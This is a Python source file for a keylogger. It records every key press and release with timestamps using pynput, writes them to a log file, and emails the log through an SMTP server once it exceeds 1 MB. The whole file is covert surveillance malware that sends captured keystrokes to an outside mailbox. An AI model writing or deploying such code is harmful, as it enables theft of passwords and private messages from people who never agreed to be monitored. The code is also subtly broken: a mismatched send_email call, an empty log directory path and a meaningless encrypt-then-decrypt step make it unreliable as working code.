import os
import sys
import time
import smtplib
import cryptography.fernet
from pynput.keyboard import Key, Listener

# Email configuration
EMAIL_FROM = "sender@example.com"
EMAIL_TO = "recipient@example.com"
EMAIL_PASSWORD = "your-email-password"
SMTP_SERVER = "smtp.example.com"
SMTP_PORT = 587

# Log file configuration
LOG_DIR = ""
LOG_FILE = "key_log.txt"

# Encryption key
ENCRYPTION_KEY = b"your-encryption-key"

# Timestamp format
TIMESTAMP_FORMAT = "%Y-%m-%d %H:%M:%S"

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Create a cipher object for encryption and decryption
cipher = cryptography.fernet.Fernet(ENCRYPTION_KEY)

def encrypt_data(data):
    """Encrypt the given data using the encryption key."""
    return cipher.encrypt(data.encode())

def decrypt_data(data):
    """Decrypt the given data using the encryption key."""
    return cipher.decrypt(data).decode()

def send_email(subject, body):
    """Send an email with the given subject and body."""
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_FROM, EMAIL_PASSWORD)
        message = "Subject: {0}\n\n{1}".format(subject, body)
        server.sendmail(EMAIL_FROM, EMAIL_TO, message)
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print("Failed to send email: {0}".format(str(e)))

def on_press(key):
    try:
        with open(os.path.join(LOG_DIR, LOG_FILE), "a") as f:
            timestamp = time.strftime(TIMESTAMP_FORMAT)
            user = os.getlogin()
            data = "{0} {1} pressed\n".format(timestamp, key)
            f.write(decrypt_data(encrypt_data(data)))
    except Exception as e:
        print("Failed to write to log file: {0}".format(str(e)))

def on_release(key):
    try:
        with open(os.path.join(LOG_DIR, LOG_FILE), "a") as f:
            timestamp = time.strftime(TIMESTAMP_FORMAT)
            user = os.getlogin()
            data = "{0} {1} released\n".format(timestamp, key)
            f.write(decrypt_data(encrypt_data(data)))
    except Exception as e:
        print("Failed to write to log file: {0}".format(str(e)))

    if key == Key.esc:
        return False

    # Send an email with the log file as attachment if it exceeds 1 MB
    log_file_size = os.path.getsize(os.path.join(LOG_DIR, LOG_FILE))
    if log_file_size > 1e6:
        with open(os.path.join(LOG_DIR, LOG_FILE), "rb") as f:
            attachment = f.read()
        subject = "Key log for {0}".format(user)
        body = "Please find the attached key log for {0}.".format(user)
        send_email(subject, body, attachment)

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

